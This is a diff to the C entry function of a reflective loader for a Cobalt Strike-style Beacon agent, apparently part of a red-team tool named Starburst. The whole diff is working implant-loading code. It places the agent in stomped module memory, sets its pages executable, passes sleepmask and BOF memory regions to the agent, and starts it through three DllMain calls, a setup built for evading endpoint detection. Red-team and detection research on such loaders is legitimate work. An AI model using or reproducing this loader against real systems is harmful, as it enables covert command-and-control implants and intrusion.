@@ -48,7 +48,9 @@ FUNC VOID Main(
     PVOID                   pProtect            = { 0 };
     SIZE_T                  szProtect           = { 0 };
     ULONG                   oldProtect          = { 0 };
-    UDRL_USER_DATA          userData            = { 0 };
+    UDRL_USER_DATA          udrlData            = { 0 };
+    USER_DATA               userData            = { 0 };
+    ALLOCATED_MEMORY        allocatedMemory     = { 0 };
 
     if (!ResolveApis())
         return;
@@ -132,83 +134,112 @@ FUNC VOID Main(
     szProtect = cData->szBeaconExec;
     API( NtProtectVirtualMemory )(NtCurrentProcess(), &pProtect, &szProtect, PAGE_EXECUTE_READ, &oldProtect);
 
-    // Populate UDRL_USER_DATA
+    //
+    // ── Populate CS USER_DATA (Beacon User Data) ──
+    //
+    // The agent's internal sleepmask/BOF loading reads USER_DATA + ALLOCATED_MEMORY
+    // (from beacon.h) to learn where those regions live. This is passed via
+    // DLL_BEACON_USER_DATA - the agent copies it internally.
+    //
 
-    userData.magic   = UDRL_MAGIC;
-    userData.version = STARBURST_VERSION;
+    userData.version = COBALT_STRIKE_VERSION;
 
     MmCopy(userData.custom, &cData, sizeof(PVOID));
 
-    userData.agent_base  = cData->pStompBeacon;
-    userData.agent_size  = cData->szBeacon;
-    userData.loader_base = Instance()->Base.Buffer;
-    userData.loader_size = Instance()->Base.Length;
+    userData.allocatedMemory = &allocatedMemory;
+
+    // Sleepmask region
+    allocatedMemory.AllocatedMemoryRegions[0].Purpose = PURPOSE_SLEEPMASK_MEMORY;
+    allocatedMemory.AllocatedMemoryRegions[0].AllocationBase = cData->pStompSleepmask;
+    allocatedMemory.AllocatedMemoryRegions[0].RegionSize = SZ_SLEEPMASK;
+    allocatedMemory.AllocatedMemoryRegions[0].Sections[0].Label = LABEL_BUFFER;
+    allocatedMemory.AllocatedMemoryRegions[0].Sections[0].BaseAddress = cData->pStompSleepmask;
+    allocatedMemory.AllocatedMemoryRegions[0].Sections[0].VirtualSize = SZ_SLEEPMASK;
+    allocatedMemory.AllocatedMemoryRegions[0].Sections[0].CurrentProtect = PAGE_READWRITE;
+
+    // BOF region
+    allocatedMemory.AllocatedMemoryRegions[1].Purpose = PURPOSE_BOF_MEMORY;
+    allocatedMemory.AllocatedMemoryRegions[1].AllocationBase = cData->pStompBof;
+    allocatedMemory.AllocatedMemoryRegions[1].RegionSize = SZ_BOF;
+    allocatedMemory.AllocatedMemoryRegions[1].Sections[0].Label = LABEL_BUFFER;
+    allocatedMemory.AllocatedMemoryRegions[1].Sections[0].BaseAddress = cData->pStompBof;
+    allocatedMemory.AllocatedMemoryRegions[1].Sections[0].VirtualSize = SZ_BOF;
+    allocatedMemory.AllocatedMemoryRegions[1].Sections[0].CurrentProtect = PAGE_READWRITE;
+
+    // Send BUD to agent - agent copies this internally
+    API( DllMain )(0, DLL_BEACON_USER_DATA, &userData);
+
+    //
+    // ── Populate UDRL_USER_DATA ──
+    //
+    // Starburst's own bridge struct for the sleep mask. Passed as lpvReserved
+    // in DLL_PROCESS_ATTACH so the sleep mask can access granular region info.
+    //
+
+    udrlData.magic   = UDRL_MAGIC;
+    udrlData.version = STARBURST_VERSION;
+
+    MmCopy(udrlData.custom, &cData, sizeof(PVOID));
+
+    udrlData.agent_base  = cData->pStompBeacon;
+    udrlData.agent_size  = cData->szBeacon;
+    udrlData.loader_base = Instance()->Base.Buffer;
+    udrlData.loader_size = Instance()->Base.Length;
 
     // Region 0: Agent image
-    userData.regions[0].purpose    = UDRL_PURPOSE_AGENT_IMAGE;
-    userData.regions[0].alloc_base = cData->pStompBeacon;
-    userData.regions[0].region_size = cData->szBeacon;
+    udrlData.regions[0].purpose    = UDRL_PURPOSE_AGENT_IMAGE;
+    udrlData.regions[0].alloc_base = cData->pStompBeacon;
+    udrlData.regions[0].region_size = cData->szBeacon;
 
-    userData.regions[0].sections[0].label   = UDRL_LABEL_TEXT;
-    userData.regions[0].sections[0].base    = cData->pStompBeaconExec;
-    userData.regions[0].sections[0].size    = cData->szBeaconExec;
-    userData.regions[0].sections[0].protect = PAGE_EXECUTE_READ;
+    udrlData.regions[0].sections[0].label   = UDRL_LABEL_TEXT;
+    udrlData.regions[0].sections[0].base    = cData->pStompBeaconExec;
+    udrlData.regions[0].sections[0].size    = cData->szBeaconExec;
+    udrlData.regions[0].sections[0].protect = PAGE_EXECUTE_READ;
 
-    userData.regions[0].sections[1].label   = UDRL_LABEL_DATA;
-    userData.regions[0].sections[1].base    = cData->pStompBeaconRw;
-    userData.regions[0].sections[1].size    = cData->szBeaconRw;
-    userData.regions[0].sections[1].protect = PAGE_READWRITE;
+    udrlData.regions[0].sections[1].label   = UDRL_LABEL_DATA;
+    udrlData.regions[0].sections[1].base    = cData->pStompBeaconRw;
+    udrlData.regions[0].sections[1].size    = cData->szBeaconRw;
+    udrlData.regions[0].sections[1].protect = PAGE_READWRITE;
 
-    userData.regions[0].section_count = 2;
+    udrlData.regions[0].section_count = 2;
 
     // Region 1: Sleepmask memory
-    userData.regions[1].purpose    = UDRL_PURPOSE_SLEEPMASK_MEMORY;
-    userData.regions[1].alloc_base = cData->pStompSleepmask;
-    userData.regions[1].region_size = SZ_SLEEPMASK;
+    udrlData.regions[1].purpose    = UDRL_PURPOSE_SLEEPMASK_MEMORY;
+    udrlData.regions[1].alloc_base = cData->pStompSleepmask;
+    udrlData.regions[1].region_size = SZ_SLEEPMASK;
 
-    userData.regions[1].sections[0].label   = UDRL_LABEL_BUFFER;
-    userData.regions[1].sections[0].base    = cData->pStompSleepmask;
-    userData.regions[1].sections[0].size    = SZ_SLEEPMASK;
-    userData.regions[1].sections[0].protect = PAGE_READWRITE;
+    udrlData.regions[1].sections[0].label   = UDRL_LABEL_BUFFER;
+    udrlData.regions[1].sections[0].base    = cData->pStompSleepmask;
+    udrlData.regions[1].sections[0].size    = SZ_SLEEPMASK;
+    udrlData.regions[1].sections[0].protect = PAGE_READWRITE;
 
-    userData.regions[1].section_count = 1;
+    udrlData.regions[1].section_count = 1;
 
     // Region 2: BOF memory
-    userData.regions[2].purpose    = UDRL_PURPOSE_BOF_MEMORY;
-    userData.regions[2].alloc_base = cData->pStompBof;
-    userData.regions[2].region_size = SZ_BOF;
+    udrlData.regions[2].purpose    = UDRL_PURPOSE_BOF_MEMORY;
+    udrlData.regions[2].alloc_base = cData->pStompBof;
+    udrlData.regions[2].region_size = SZ_BOF;
 
-    userData.regions[2].sections[0].label   = UDRL_LABEL_BUFFER;
-    userData.regions[2].sections[0].base    = cData->pStompBof;
-    userData.regions[2].sections[0].size    = SZ_BOF;
-    userData.regions[2].sections[0].protect = PAGE_READWRITE;
+    udrlData.regions[2].sections[0].label   = UDRL_LABEL_BUFFER;
+    udrlData.regions[2].sections[0].base    = cData->pStompBof;
+    udrlData.regions[2].sections[0].size    = SZ_BOF;
+    udrlData.regions[2].sections[0].protect = PAGE_READWRITE;
 
-    userData.regions[2].section_count = 1;
+    udrlData.regions[2].section_count = 1;
 
-    userData.region_count = 3;
+    udrlData.region_count = 3;
 
     PRINT("UDRL_USER_DATA: magic=%llx version=%x regions=%d",
-        userData.magic, userData.version, userData.region_count);
+        udrlData.magic, udrlData.version, udrlData.region_count);
 
-    //
     // ── Transfer execution ──
-    //
-    // CS: API( NtFlushInstructionCache )((HANDLE)-1, NULL, 0);
-    // Same in Starburst - flush stale code from the instruction cache
-    //
+
     API( NtFlushInstructionCache )((HANDLE)-1, NULL, 0);
 
-    //
-    // CS has three DllMain calls:
-    //   1. API(DllMain)(0, DLL_BEACON_USER_DATA, &userData)  - Beacon copies the BUD
-    //   2. API(DllMain)(pStompBeacon, DLL_PROCESS_ATTACH, NULL) - Beacon initializes
-    //   3. API(DllMain)(StRipStart(), DLL_BEACON_START, NULL)  - Beacon starts
-    //
-    // Starburst combines these into a single DLL_PROCESS_ATTACH call.
-    // The UDRL_USER_DATA pointer is passed as lpvReserved (third argument),
-    // which the agent retrieves and copies during its own initialization.
-    // The agent starts immediately upon return - no separate START call needed.
-    //
+    // DLL_PROCESS_ATTACH - agent initializes, receives UDRL_USER_DATA as lpvReserved
+    API( DllMain )(cData->pStompBeacon, DLL_PROCESS_ATTACH, &udrlData);
+
+    // DLL_BEACON_START - agent begins operation
     PRINTB("Calling agent entry!");
-    API( DllMain )((HINSTANCE)cData->pStompBeacon, DLL_PROCESS_ATTACH, &userData);
+    API( DllMain )(StRipStart(), DLL_BEACON_START, NULL);
 }
